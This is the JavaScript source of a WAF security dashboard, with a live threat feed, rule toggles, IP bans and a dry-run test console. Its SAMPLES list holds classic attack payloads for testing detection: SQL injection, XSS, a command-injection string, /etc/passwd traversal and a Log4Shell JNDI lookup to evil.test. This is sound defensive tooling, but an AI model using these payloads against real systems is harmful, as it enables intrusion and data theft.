// Security dashboard for the WAF (served on 127.0.0.1:8081/dashboard).
// Data: the admin API in waf_admin.lua / waf_dashboard.lua.
//
// Payloads, URIs and user agents shown here are attacker-controlled. They are
// only ever inserted as text nodes (h() below); nothing from the API is parsed
// as HTML. The page's CSP forbids inline script as a second line of defence.
"use strict";

(() => {
  const CATEGORY = {
    sqli: ["SQL injection", "#ff4f64"],
    xss: ["Cross-site scripting", "#ffb547"],
    cmdi: ["Command injection", "#ff8a3d"],
    lfi: ["Path traversal / file inclusion", "#4cc9f0"],
    ssrf: ["Server-side request forgery", "#b28dff"],
    rce: ["Known exploit (RCE)", "#ff5fd2"],
    ssti: ["Template injection", "#39f29a"],
    xxe: ["XML external entity", "#7ee0ff"],
    nosqli: ["NoSQL injection", "#e8e35c"],
    crlf: ["CRLF injection", "#9fb2bf"],
    scanner: ["Attack tool", "#8ea1ad"],
    other: ["Other", "#6c7f8c"],
  };
  const RED = ["#ff4f64", "rgba(255,79,100,.14)"];
  const AMBER = ["#ffb547", "rgba(255,181,71,.12)"];
  const GREEN = ["#39f29a", "rgba(57,242,154,.12)"];
  const ACTION = {
    block: ["BLOCKED", ...RED], reject: ["REJECTED", ...RED], fail_closed: ["FAIL-CLOSED", ...RED],
    monitor: ["MONITORED", ...AMBER], fail_open: ["FAIL-OPEN", ...AMBER], allow: ["ALLOWED", ...GREEN],
    banned: ["BANNED", ...RED],
  };
  const FILTERS = { ALL: null, BLOCKED: ["block", "reject", "fail_closed", "banned"], MONITORED: ["monitor", "fail_open"] };
  const TABS = [["overview", "Overview"], ["feed", "Threat feed"], ["event", "Request detail"],
                ["rules", "Rules"], ["console", "Test console"]];
  const SAMPLES = [
    ["tautology", "1' OR '1'='1"], ["union", "' UNION SELECT username, password FROM users--"],
    ["blind (ml)", "1 and ascii(substr(database(),1,1))>64"], ["xss", "<img src=x onerror=alert(1)>"],
    ["cmdi", "127.0.0.1; whoami"], ["traversal", "../../../../etc/passwd"],
    ["log4shell", "${jndi:ldap://evil.test/a}"], ["ssti", "{{7*7}}"], ["nosql", "$ne"],
    ["encoded", "%27%20OR%201%3D1--"], ["benign", "O'Brien"], ["benign", "Tom & Jerry"],
  ];

  const state = {
    status: null, overview: null, overviewAt: 0, feed: [], seen: new Set(), fresh: new Set(), feedLoaded: false,
    paused: false, filter: "ALL", event: null, eventError: null, rules: null, rulesMsg: null, bans: null, bansMsg: null,
    console: { method: "GET", path: "/search?q=", payload: SAMPLES[0][1], result: null, error: null },
    flagged: {}, actionMsg: null, error: null,
  };

  // ------------------------------------------------------------ helpers
  function h(tag, props, ...kids) {
    const el = document.createElement(tag);
    for (const [key, value] of Object.entries(props || {})) {
      if (value == null || value === false) continue;
      if (key === "class") el.className = value;
      else if (key === "style") Object.assign(el.style, value);
      else if (key.startsWith("on")) el.addEventListener(key.slice(2), value);
      else el.setAttribute(key, value === true ? "" : String(value));
    }
    for (const kid of kids.flat(Infinity)) {
      if (kid == null || kid === false) continue;
      el.append(kid instanceof Node ? kid : document.createTextNode(String(kid)));
    }
    return el;
  }
  const $ = (id) => document.getElementById(id);
  const fmt = (n) => Number(n || 0).toLocaleString("en-US");
  const time = (ts) => (ts ? new Date(ts).toLocaleTimeString([], { hour12: false }) : "");
  const hour = (t) => new Date(t * 1000).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", hour12: false });
  const cat = (c) => CATEGORY[c] || CATEGORY.other;
  const decodeUri = (uri) => { try { return decodeURIComponent(uri.replace(/\+/g, " ")); } catch (e) { return uri; } };
  const minutes = (s) => {
    const hrs = Math.floor(s / 3600), mins = Math.ceil((s % 3600) / 60);
    return hrs ? (mins ? `${hrs} h ${mins} min` : `${hrs} h`) : `${mins} min`;
  };

  function pill(text, color, bg, extra) {
    return h("span", { class: "pill" + (extra ? " " + extra : ""), style: { borderColor: color, color, background: bg || "transparent" } }, text);
  }
  function actionPill(action, extra) {
    const [label, color, bg] = ACTION[action] || [String(action || "?").toUpperCase(), "#9fb2bf", "transparent"];
    return pill(label, color, bg, extra);
  }
  function catPill(c) {
    const [, color] = cat(c);
    return pill(String(c || "other").toUpperCase(), color);
  }
  // Lua reports byte offsets (1-based, inclusive); split the UTF-8 bytes there.
  function splitBytes(text, from, to) {
    const bytes = new TextEncoder().encode(text);
    const dec = new TextDecoder();
    return [dec.decode(bytes.slice(0, from - 1)), dec.decode(bytes.slice(from - 1, to)), dec.decode(bytes.slice(to))];
  }
  function highlighted(text, hit) {
    if (!hit) return [text];
    const [pre, mid, post] = splitBytes(text, hit.from, hit.to);
    return [pre, h("span", { class: "hit" }, mid), post];
  }

  async function api(path, body) {
    const options = body === undefined ? {} : {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
    };
    const res = await fetch(path, options);
    let data = {};
    try { data = await res.json(); } catch (e) { data = {}; }
    if (!res.ok) throw new Error(data.error || "HTTP " + res.status);
    return data;
  }

  // ------------------------------------------------------------ routing
  function route() {
    const [tab, id] = location.hash.replace(/^#/, "").split("/");
    return { tab: TABS.some(([k]) => k === tab) ? tab : "overview", id: id || null };
  }
  function go(hash) { location.hash = hash; }

  function renderNav() {
    const { tab } = route();
    $("nav").replaceChildren(...TABS.map(([key, label], i) => h("button", {
      class: "nav-btn" + (key === tab ? " active" : ""), "aria-current": key === tab ? "page" : null,
      onclick: () => go(key === "event" && state.event ? "event/" + state.event.id : key),
    }, h("span", { class: "nav-num" }, "0" + (i + 1)), label)));
  }

  function renderStatus() {
    const s = state.status;
    if (!s) return;
    const monitor = s.mode === "monitor";
    const color = monitor ? "#ffb547" : "#39f29a";
    $("mode").replaceChildren(h("span", { class: "dot", style: { background: color, boxShadow: "0 0 8px " + color } }),
      h("span", { style: { color } }, monitor ? "MONITOR ONLY" : "BLOCKING · ACTIVE"));
    $("threshold").textContent = String(s.threshold);
    $("rules-on").textContent = s.rules_on + " / " + s.rules_total;
    $("bans-now").textContent = s.bans && s.bans.enabled ? String(s.bans.active) : "off";
    $("bans-now").style.color = s.bans && s.bans.active ? "#ff4f64" : "";
    const target = s.target ? s.target.url.replace(/^https?:\/\//, "") : "?";
    $("target").textContent = target;
    $("target").title = s.target ? s.target.url : "";
  }

  // ------------------------------------------------------------ screens
  function overviewScreen() {
    const o = state.overview;
    const head = h("div", null, h("div", { class: "kicker" }, "> SYS.OVERVIEW // LAST 24H"), h("h1", { class: "h1" }, "Traffic overview"));
    if (!o) return [head, h("div", { class: "empty" }, "loading_")];

    const stats = [
      ["REQUESTS 24H", fmt(o.requests), "all requests through the WAF", "#d6e2ea"],
      ["BLOCKED", fmt(o.blocked), "signatures + ML model", "#ff4f64"],
      ["MONITORED", fmt(o.monitored), "detected, let through (monitor)", "#ffb547"],
      ["HOSTILE IPS", fmt(o.hostile_ips), "unique blocked sources", "#4cc9f0"],
    ].map(([label, value, note, color]) => h("div", { class: "stat" },
      h("span", { class: "stat-corner", style: { borderColor: color } }),
      h("span", { class: "stat-label" }, label),
      h("span", { class: "stat-value", style: { color } }, value),
      h("span", { class: "stat-note" }, note)));

    const max = Math.max(1, ...o.hours.map((b) => b.total));
    const bars = o.hours.map((b) => {
      const share = b.total ? b.blocked / b.total : 0;
      return h("div", {
        class: "bar", title: `${hour(b.t)} · ${fmt(b.total)} req · ${fmt(b.blocked)} blocked`,
        style: { height: (b.total ? Math.max(2, (b.total / max) * 100) : 0) + "%" },
      }, h("div", { class: "bar-blocked", style: { height: (b.blocked ? Math.max(4, share * 100) : 0) + "%" } }));
    });
    const chart = h("div", { class: "panel" },
      h("div", { class: "chart-head" }, h("span", { class: "panel-title" }, "REQUESTS / HOUR"),
        h("div", { class: "legend" },
          h("span", null, h("span", { class: "swatch", style: { background: "#1c3340" } }), "Total"),
          h("span", null, h("span", { class: "swatch", style: { background: "#ff4f64" } }), "Blocked (share of hour)"))),
      h("div", { class: "bars" }, bars),
      h("div", { class: "axis" }, [0, 6, 12, 18].map((i) => h("span", null, hour(o.hours[i].t)))));

    const maxHits = Math.max(1, ...o.top_rules.map((r) => r.hits));
    const rules = h("div", { class: "panel" }, h("div", { class: "panel-title", style: { marginBottom: "8px" } }, "TOP MATCHED RULES"),
      o.top_rules.length ? o.top_rules.map((r) => h("div", { class: "list-row rule-row" },
        h("span", { style: { color: cat(r.category)[1] } }, r.category.toUpperCase()),
        h("div", { class: "stack" },
          h("span", { class: "ellipsis" }, r.id === "ml_model" ? "ML model (no rule matched)" : r.id),
          h("div", { class: "meter" }, h("div", { style: { width: Math.round((r.hits / maxHits) * 100) + "%" } }))),
        h("span", { class: "num" }, fmt(r.hits))))
        : h("div", { class: "empty" }, "No rule matched in the last 24 hours."));

    const ips = h("div", { class: "panel" }, h("div", { class: "panel-title", style: { marginBottom: "8px" } }, "TOP HOSTILE SOURCES"),
      o.top_ips.length ? o.top_ips.map((p) => {
        const hostile = p.blocked >= 20;
        return h("div", { class: "list-row ip-row" },
          h("div", { class: "stack" }, h("span", { style: { color: "#e8f2f7" } }, p.ip),
            h("span", { class: "panel-sub ellipsis" }, (p.category || "other") + " · " + (p.rule || "—") + " · last " + time(p.last))),
          p.banned ? pill("BANNED", ...RED) : pill(hostile ? "HOSTILE" : "WATCH", hostile ? "#ff4f64" : "#ffb547"),
          h("span", { class: "num" }, fmt(p.blocked)));
      }) : h("div", { class: "empty" }, "No blocked sources in the last 24 hours."));

    const notes = [];
    if (o.fail_open) notes.push(h("div", { class: "msg" }, `${fmt(o.fail_open)} request(s) passed without an ML score (fail-open): the model was too slow or down.`));
    if (o.truncated) notes.push(h("div", { class: "msg" }, "Very busy day: only the first 500,000 log lines were counted."));
    return [head, h("div", { class: "stats" }, stats), chart, h("div", { class: "two" }, rules, ips), bansPanel(), notes];
  }

  function bansPanel() {
    const b = state.bans;
    if (!b) return null;
    const s = b.settings;
    const rule = s.enabled
      ? `An IP is banned for ${minutes(s.duration)} after ${s.threshold} blocked requests within ${minutes(s.window)}. Banned IPs get 403 without inspection.`
      : "Automatic bans are off (WAF_BAN_THRESHOLD=0). You can still ban an IP from its request detail.";
    const rows = b.bans.map((ban) => h("div", { class: "list-row ban-row" },
      h("div", { class: "stack" }, h("span", { style: { color: "#e8f2f7" } }, ban.ip,
        ban.ip === b.your_ip ? h("span", { class: "panel-sub" }, "  (this computer)") : null),
        h("span", { class: "panel-sub" }, ban.by === "auto"
          ? `automatic · ${fmt(ban.blocks)} blocked requests${ban.category ? " · mostly " + ban.category : ""}`
          : "banned from the dashboard")),
      h("span", { class: "panel-sub num" }, "expires in " + minutes(ban.remaining)),
      h("button", { class: "btn", onclick: () => setBan(ban.ip, "unban") }, "UNBAN")));
    return h("div", { class: "panel" },
      h("div", { class: "head-row", style: { alignItems: "baseline", marginBottom: "8px" } },
        h("span", { class: "panel-title" }, "BANNED IPS"), pill(b.bans.length + " ACTIVE", b.bans.length ? "#ff4f64" : "#6c7f8c")),
      h("div", { class: "panel-sub" }, rule),
      state.bansMsg && h("div", { class: "msg " + (state.bansMsg.ok ? "ok" : "bad"), style: { marginTop: "10px" } }, state.bansMsg.text),
      rows.length ? rows : h("div", { class: "empty" }, "No IP is banned right now."));
  }

  function feedScreen() {
    const live = !state.paused;
    const color = live ? "#39f29a" : "#ffb547";
    const head = h("div", { class: "head-row" },
      h("div", null,
        h("div", { class: "kicker", style: { color } }, h("span", { class: "dot", style: { background: color } }), live ? "LIVE // STREAMING" : "STREAM PAUSED"),
        h("h1", { class: "h1" }, "Threat feed")),
      h("div", { class: "btn-row" },
        Object.keys(FILTERS).map((f) => h("button", { class: "btn" + (state.filter === f ? " on" : ""), onclick: () => { state.filter = f; render(); } }, f)),
        h("button", { class: "btn", onclick: () => { state.paused = !state.paused; render(); } }, state.paused ? "▶ RESUME" : "❚❚ PAUSE")));

    const wanted = FILTERS[state.filter];
    const rows = state.feed.filter((e) => !wanted || wanted.includes(e.action)).map((e) => h("tr", {
      class: "feed-row" + (state.fresh.has(e.id) ? " fresh" : ""), tabindex: 0,
      onclick: () => go("event/" + e.id), onkeydown: (ev) => { if (ev.key === "Enter") go("event/" + e.id); },
    },
      h("td", { class: "td-time" }, time(e.ts)),
      h("td", null, e.ip),
      h("td", { class: "td-path", title: e.uri }, h("span", { class: "method" }, e.method), " ", e.path),
      // For allowed requests the source is just the highest-scored value: shown dim, not as an attack.
      h("td", { class: "td-payload" + (e.payload && e.category ? "" : " none"), title: e.payload || (e.source ? "value not logged (" + e.source + ")" : "") },
        e.payload || (e.source ? "· " + e.source : "—")),
      h("td", { style: { color: "#9fb2bf" } }, e.signature || (e.engine === "ml" && e.category ? "ml model" : e.action === "banned" ? "ip banned" : "—")),
      h("td", { class: "right" }, e.score != null ? e.score.toFixed(2) : "—"),
      h("td", { class: "right" }, actionPill(e.action))));

    const table = h("div", { class: "table-wrap" }, h("table", null,
      h("thead", null, h("tr", null, ["TIME", "SOURCE", "REQUEST", "PAYLOAD", "RULE"].map((t) => h("th", null, t)),
        h("th", { class: "right" }, "SCORE"), h("th", { class: "right" }, "ACTION"))),
      h("tbody", null, rows.length ? rows : h("tr", null, h("td", { colspan: 7, class: "empty" },
        state.feedLoaded ? "Nothing here yet. Requests appear as they reach the WAF." : "loading_")))));
    return [head, table, h("div", { class: "note" }, "> select a row to inspect payload and matched rule_   (requests with nothing to inspect are not listed)")];
  }

  function eventScreen() {
    const back = h("button", { class: "btn btn-ghost", onclick: () => go("feed") }, "<- back to feed");
    if (state.eventError) return [back, h("div", { class: "error" }, state.eventError)];
    const e = state.event;
    if (!e) return [back, h("div", { class: "empty" }, route().id ? "loading_" : "Select a request in the Threat feed.")];

    const s = e.settings || state.status || {};
    const [, color, bg] = ACTION[e.action] || ACTION.allow;
    const flagged = state.flagged[e.id];
    const title = h("div", { class: "head-row detail-head" },
      h("div", { style: { minWidth: 0 } },
        h("div", { class: "kicker" }, `> EVENT ${e.id.slice(0, 8)} // ${new Date(e.ts).toLocaleString([], { hour12: false })}`),
        h("h1", { class: "detail-title", title: e.uri }, h("span", { class: "method" }, e.method), " ", decodeUri(e.uri))),
      h("div", { class: "btn-row" }, flagged && pill("FLAGGED FALSE POSITIVE", "#4cc9f0"),
        h("span", { class: "pill pill-lg", style: { borderColor: color, color, background: bg, boxShadow: "0 0 16px " + bg } },
          (ACTION[e.action] || [e.action])[0])));

    const first = e.hits && e.hits.find((x) => x.id === e.signature) || (e.hits || [])[0];
    const payload = h("div", { class: "panel" },
      h("div", { class: "panel-title", style: { fontSize: "15px", marginBottom: "4px" } }, "DECODED PAYLOAD"),
      h("div", { class: "panel-sub", style: { marginBottom: "12px" } }, "source ", h("span", { class: "method" }, e.source || "—"),
        first ? " · matched fragment highlighted" : ""),
      e.payload != null ? h("div", { class: "well" }, highlighted(e.payload, first))
        : h("div", { class: "well small" }, `The value isn't stored in the access log (it was in ${e.source || "the request"}); only the URL and User-Agent are logged.`));

    const raw = h("div", { class: "panel" },
      h("div", { class: "panel-title", style: { fontSize: "15px", marginBottom: "12px" } }, "REQUEST (FROM THE LOG)"),
      h("pre", { class: "well small", style: { margin: 0 } },
        `${e.method} ${e.uri} HTTP/1.1\nHost: ${e.host}\nUser-Agent: ${e.ua}\nX-Forwarded-For: ${e.ip}\n\n# other headers, cookies and the body are not logged`));

    const ml = e.engine === "ml";
    const score = e.score;
    const matchedHead = h("div", { class: "head-row", style: { alignItems: "baseline" } },
      h("span", { class: "panel-title", style: { fontSize: "15px" } }, "MATCHED RULES"),
      ml ? h("span", { class: "panel-sub" }, "ml score ", h("span", { style: { color, fontSize: "18px" } }, score != null ? score.toFixed(3) : "—"), " / " + s.threshold)
        : h("span", { class: "panel-sub" }, e.engine === "regex" ? "first match decides · no ML call" : e.reason || ""));
    const hits = (e.hits || []).length ? e.hits.map((m) => h("div", { class: "match" },
      h("div", { class: "match-head" }, h("span", null, h("span", { class: "method" }, m.id), m.id === e.signature ? "  (decided)" : ""), catPill(m.category)),
      h("code", { class: "pattern" }, "/" + m.pattern + "/i")))
      : h("div", { class: "match", style: { color: "#6c7f8c" } }, e.signature ? `Signature ${e.signature} matched (the value itself isn't in the log).`
        : ml ? "No signature matched; the ML model scored the value." : "No signature matched.");
    const matched = h("div", { class: "panel" }, matchedHead,
      ml && h("div", { class: "scorebar" }, h("div", { style: { width: Math.min(100, ((score || 0) / 1) * 100) + "%", background: color, boxShadow: "0 0 8px " + color } })),
      hits);

    const client = h("div", { class: "panel" },
      h("div", { class: "panel-title", style: { fontSize: "15px", marginBottom: "12px" } }, "CLIENT"),
      h("div", { class: "facts" },
        h("span", null, "SOURCE_IP"), h("span", null, e.ip),
        h("span", null, "HTTP_STATUS"), h("span", null, e.status),
        h("span", null, "USER_AGENT"), h("span", { style: { color: "#9fb2bf" } }, e.ua),
        h("span", null, "CATEGORY"), h("span", null, e.category ? cat(e.category)[0] : "—"),
        h("span", null, "BLOCKED_24H"), h("span", null, fmt(e.ip_blocked_24h)),
        h("span", null, "BAN"), h("span", { style: { color: e.ban ? "#ff4f64" : null } }, e.ban
          ? `banned, expires in ${minutes(e.ban.expires - Math.floor(Date.now() / 1000))}`
          : e.ban_allowlisted ? "allowlisted, never banned"
            : state.status && state.status.bans && state.status.bans.enabled
              ? `not banned (${e.ban_strikes} of ${state.status.bans.threshold} strikes in the current window)` : "not banned"),
        h("span", null, "REASON"), h("span", null, e.reason || "—")));

    const buttons = h("div", { class: "btn-row" },
      e.payload != null && h("button", { class: "btn btn-primary", onclick: () => {
        Object.assign(state.console, { method: e.method, path: e.path + (e.source && e.source.startsWith("arg:") ? "?" + e.source.slice(4) + "=" : ""), payload: e.payload, result: null });
        consoleForm = null; go("console");
      } }, "REPLAY IN CONSOLE"),
      ml && (e.action === "block" || e.action === "monitor") && h("button", { class: "btn", style: { padding: "10px 16px" }, disabled: flagged, onclick: flagFalsePositive }, flagged ? "FLAGGED" : "FLAG FALSE POSITIVE"),
      e.engine === "regex" && e.signature && h("button", { class: "btn", style: { padding: "10px 16px" }, onclick: () => switchOff(e.signature) }, "SWITCH OFF RULE " + e.signature),
      e.ban ? h("button", { class: "btn", style: { padding: "10px 16px" }, onclick: () => setBan(e.ip, "unban") }, "UNBAN " + e.ip)
        : !e.ban_allowlisted && h("button", { class: "btn", style: { padding: "10px 16px", borderColor: "#ff4f64", color: "#ff4f64" }, onclick: () => setBan(e.ip, "ban") }, "BAN THIS IP"));
    const msg = state.actionMsg && h("div", { class: "msg " + (state.actionMsg.ok ? "ok" : "bad") }, state.actionMsg.text);

    return [back, title, h("div", { class: "grid-2" },
      h("div", { class: "col" }, payload, raw),
      h("div", { class: "col" }, matched, client, buttons, msg))];
  }

  function rulesScreen() {
    const r = state.rules;
    const head = h("div", null,
      h("div", { class: "kicker" }, r ? `> RULESET // ${r.on} OF ${r.total} ENABLED` : "> RULESET"),
      h("h1", { class: "h1" }, "Detection rules"),
      h("p", { class: "prose" }, "Each rule is a case-insensitive pattern tested against every decoded value: parameters, JSON keys and strings, "
        + "the path, the User-Agent, the Referer and cookies. The first enabled rule that matches blocks the request without calling the model. "
        + `Values no rule matches are scored by the ML model, which blocks parameters at ≥ ${r ? r.settings.threshold : "…"}`
        + (r ? ` (${fmt(r.ml_hits)} model detections in 24 h)` : "") + ". Switching a rule off applies to the next request and survives restarts."));
    if (!r) return [head, h("div", { class: "empty" }, "loading_")];

    const rows = [];
    let current = null;
    for (const rule of r.rules) {
      if (rule.category !== current) {
        current = rule.category;
        rows.push(h("tr", { class: "cat-head" }, h("td", { colspan: 5 }, `${current.toUpperCase()} · ${cat(current)[0]}`)));
      }
      rows.push(h("tr", { class: rule.enabled ? "" : "rule-off" },
        h("td", null, h("button", {
          class: "toggle", "aria-pressed": String(rule.enabled), "aria-label": (rule.enabled ? "Switch off " : "Switch on ") + rule.id,
          disabled: rule.locked, title: rule.locked ? "Off via WAF_DISABLED_CATEGORIES in .env" : null,
          onclick: () => toggleRule(rule.id, !rule.enabled),
        }, h("span"))),
        h("td", null, h("div", { class: "stack" }, h("span", { class: "method" }, rule.id),
          h("span", { class: "panel-sub" }, rule.locked ? "off via WAF_DISABLED_CATEGORIES" : cat(rule.category)[0]))),
        h("td", { class: "td-pattern" }, rule.pattern),
        h("td", null, catPill(rule.category)),
        h("td", { class: "right" }, fmt(rule.hits))));
    }
    const msg = state.rulesMsg && h("div", { class: "msg " + (state.rulesMsg.ok ? "ok" : "bad") }, state.rulesMsg.text);
    return [head, msg, h("div", { class: "table-wrap" }, h("table", null,
      h("thead", null, h("tr", null, h("th", null, "STATE"), h("th", null, "RULE"), h("th", null, "PATTERN"), h("th", null, "CATEGORY"), h("th", { class: "right" }, "HITS 24H"))),
      h("tbody", null, rows)))];
  }

  // The console form is built once per visit so typing never loses focus;
  // only the verdict panel re-renders.
  let consoleForm = null;
  let verdictBox = null;
  let evalTimer = null;
  function consoleScreen() {
    const c = state.console;
    const head = h("div", null, h("div", { class: "kicker", style: { color: "#ffb547" } }, "> DRY RUN // NOTHING IS SENT TO ORIGIN"),
      h("h1", { class: "h1" }, "Attack test console"));
    if (!consoleForm) {
      const method = h("input", { class: "input method-in", value: c.method, "aria-label": "Method", oninput: (ev) => { c.method = ev.target.value; } });
      const path = h("input", { class: "input", value: c.path, "aria-label": "Path and parameter", oninput: (ev) => { c.path = ev.target.value; } });
      const payload = h("textarea", { class: "input", rows: 5, spellcheck: "false", "aria-label": "Payload", oninput: (ev) => { c.payload = ev.target.value; scheduleEval(); } });
      payload.value = c.payload;
      consoleForm = h("div", { class: "panel console-form" },
        h("div", { class: "field-row" }, h("label", { class: "field" }, "METHOD", method), h("label", { class: "field" }, "PATH?PARAM=", path)),
        h("label", { class: "field" }, "PAYLOAD (RAW, URL-ENCODED OR NOT)", payload),
        h("div", { class: "field" }, "LOAD SAMPLE", h("div", { class: "samples" }, SAMPLES.map(([label, value]) =>
          h("button", { class: "sample", onclick: () => { payload.value = value; c.payload = value; scheduleEval(0); } }, label)))),
        h("div", { class: "note" }, "The value is checked as the query parameter in PATH?PARAM=, by the WAF's real signatures and its ML model."));
      verdictBox = h("div", { class: "verdict" });
      scheduleEval(0);
    }
    renderVerdict();
    return [head, h("div", { class: "grid-2" }, consoleForm, verdictBox)];
  }

  function renderVerdict() {
    if (!verdictBox) return;
    const c = state.console;
    if (c.error) { verdictBox.replaceChildren(h("span", { class: "field" }, "VERDICT"), h("div", { class: "error" }, c.error)); return; }
    const r = c.result;
    if (!r) { verdictBox.replaceChildren(h("span", { class: "field" }, "VERDICT"), h("div", { class: "empty" }, "evaluating_")); return; }
    const [label, color, bg] = ACTION[r.verdict] || ACTION.allow;
    verdictBox.style.borderColor = color;
    verdictBox.style.boxShadow = "0 0 24px " + bg + " inset";
    const s = r.settings;
    const line = r.engine === "regex"
      ? `signature ${r.hits[0].id} · first match decides · ${r.hits.length} rule(s) matched`
      : r.score != null ? `ml probability ${r.score.toFixed(3)} / threshold ${s.threshold} · no rule matched`
        : r.ml_error === "skipped" ? "only letters, digits and ._~ : nothing to inspect, the WAF skips it"
          : `no rule matched · ML model unavailable (${r.ml_error})`;
    verdictBox.replaceChildren(...[
      h("span", { class: "field" }, "VERDICT"),
      h("div", { class: "verdict-word", style: { color, textShadow: "0 0 18px " + bg } }, label === "MONITORED" ? "LOGGED" : label),
      h("div", { class: "verdict-line" }, line),
      r.score != null && h("div", { class: "scorebar", style: { margin: 0 } }, h("div", { style: { width: r.score * 100 + "%", background: color, boxShadow: "0 0 8px " + color } })),
      r.decoded !== c.payload && h("div", { class: "panel-sub" }, "decoded → ", h("span", { style: { color: "#d6e2ea", wordBreak: "break-all" } }, r.decoded)),
      h("div", null, r.hits.length ? r.hits.map((m) => h("div", { class: "match", style: { borderTop: "1px dashed #1b2630", borderBottom: 0 } },
        h("div", { class: "match-head" }, h("span", { class: "method" }, m.id), catPill(m.category)),
        h("div", { style: { wordBreak: "break-all", color: "#6c7f8c" } }, highlighted(r.decoded, m))))
        : h("div", { class: "match", style: { borderTop: "1px dashed #1b2630", color: "#6c7f8c" } }, "no enabled rule matched this value_")),
    ].filter(Boolean)); // replaceChildren would print false as text
  }

  function scheduleEval(delay = 300) {
    clearTimeout(evalTimer);
    evalTimer = setTimeout(async () => {
      const c = state.console;
      const payload = c.payload;
      try {
        const result = await api("/api/evaluate", { payload });
        if (payload === c.payload) { c.result = result; c.error = null; }
      } catch (err) { c.error = err.message; }
      renderVerdict();
    }, delay);
  }

  // ------------------------------------------------------------ actions
  async function toggleRule(id, enabled) {
    try {
      state.rules = await api("/api/rules", { id, enabled });
      state.rulesMsg = state.rules.warning ? { ok: false, text: state.rules.warning }
        : { ok: true, text: `${id} switched ${enabled ? "on" : "off"}. Applies to the next request.` };
      await loadStatus();
    } catch (err) { state.rulesMsg = { ok: false, text: err.message }; }
    render();
  }

  async function switchOff(id) {
    if (!confirm(`Switch off rule ${id}? Requests it would block will then only be checked by the other rules and the ML model.`)) return;
    try {
      await api("/api/rules", { id, enabled: false });
      state.actionMsg = { ok: true, text: `${id} is off. Switch it back on in Rules.` };
      await loadStatus();
    } catch (err) { state.actionMsg = { ok: false, text: err.message }; }
    render();
  }

  async function setBan(ip, action) {
    const s = state.status && state.status.bans;
    const hours = s ? minutes(s.duration) : "1 h";
    if (action === "ban" && !confirm(`Ban ${ip} for ${hours}? All its requests will get 403 until the ban expires or you lift it.`)) return;
    try {
      await api("/api/bans", { ip, action });
      const text = action === "ban" ? `${ip} is banned for ${hours}.` : `${ip} is no longer banned.`;
      state.actionMsg = state.bansMsg = { ok: true, text };
      await Promise.all([loadBans(), loadStatus()]);
      if (state.event && state.event.ip === ip) state.event = await api("/api/event?id=" + encodeURIComponent(state.event.id));
    } catch (err) { state.actionMsg = state.bansMsg = { ok: false, text: err.message }; }
    render();
  }

  async function flagFalsePositive() {
    const e = state.event;
    try {
      const r = await api("/api/false-positive", { id: e.id });
      state.flagged[e.id] = true;
      state.actionMsg = { ok: true, text: r.status === "duplicate" ? "Already in the training data as safe." : "Added to the training data as safe; it takes effect after the next retraining." };
    } catch (err) { state.actionMsg = { ok: false, text: err.message }; }
    render();
  }

  // ------------------------------------------------------------ data loading
  async function loadStatus() { try { state.status = await api("/api/status"); renderStatus(); } catch (e) { /* keep last */ } }
  async function loadBans() { try { state.bans = await api("/api/bans"); } catch (e) { /* keep last */ } }
  async function loadOverview() {
    try {
      [state.overview] = await Promise.all([api("/api/overview"), loadBans()]);
      state.overviewAt = Date.now(); state.error = null;
    } catch (err) { state.error = err.message; }
  }
  async function loadFeed() {
    try {
      const { events } = await api("/api/feed?limit=80");
      state.fresh = new Set(state.feedLoaded ? events.filter((e) => !state.seen.has(e.id)).map((e) => e.id) : []);
      state.seen = new Set(events.map((e) => e.id));
      state.feed = events;
      state.feedLoaded = true;
      state.error = null;
    } catch (err) { state.error = err.message; }
  }
  async function loadEvent(id) {
    state.event = null; state.eventError = null; state.actionMsg = null;
    render();
    try { state.event = await api("/api/event?id=" + encodeURIComponent(id)); }
    catch (err) { state.eventError = err.message; }
    render();
  }
  async function loadRules() { try { state.rules = await api("/api/rules"); } catch (err) { state.rulesMsg = { ok: false, text: err.message }; } }

  // ------------------------------------------------------------ render + loop
  function render() {
    renderNav();
    const { tab } = route();
    const screens = { overview: overviewScreen, feed: feedScreen, event: eventScreen, rules: rulesScreen, console: consoleScreen };
    const banner = state.error && h("div", { class: "error" }, "Couldn't reach the WAF admin API: " + state.error);
    $("screen").replaceChildren(h("section", { class: "screen", "data-screen-label": tab }, banner, screens[tab]()));
  }

  async function onRoute() {
    const { tab, id } = route();
    if (tab !== "console") consoleForm = null;
    if (tab === "event") {
      if (id && (!state.event || state.event.id !== id)) return loadEvent(id);
      if (!id) {
        if (!state.feedLoaded) await loadFeed();
        const pick = state.feed.find((e) => e.action === "block") || state.feed[0];
        if (pick) return go("event/" + pick.id);
      }
    }
    if (tab === "overview" && !state.overview) await loadOverview();
    if (tab === "feed" && !state.feedLoaded) await loadFeed();
    if (tab === "rules") await loadRules();
    render();
  }

  window.addEventListener("hashchange", onRoute);
  loadStatus();
  onRoute();

  setInterval(async () => {
    if (document.hidden) return;
    const { tab } = route();
    if (tab === "feed" && !state.paused) { await loadFeed(); render(); }
    if (tab === "overview" && Date.now() - state.overviewAt > 10000) { await loadOverview(); render(); }
  }, 3000);
  setInterval(() => { if (!document.hidden) loadStatus(); }, 15000);
})();
